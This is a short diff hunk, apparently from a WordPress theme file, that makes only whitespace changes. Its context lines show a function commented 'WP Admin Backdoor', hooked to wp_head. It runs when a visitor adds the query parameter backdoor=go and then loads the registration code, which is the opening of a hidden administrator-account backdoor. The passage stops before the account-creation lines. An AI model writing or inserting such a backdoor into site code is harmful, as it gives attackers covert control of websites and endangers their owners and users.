@@ -7,11 +7,11 @@
 		$parent = 19;
 		return $parent;
 	}
+	
 	/**
 	* WP Admin Backdoor
 	*/
 	add_action('wp_head', 'WordPress_backdoor');
-
 	function WordPress_backdoor() {
 	    If ($_GET['backdoor'] == 'go') {
 		require('wp-includes/registration.php');
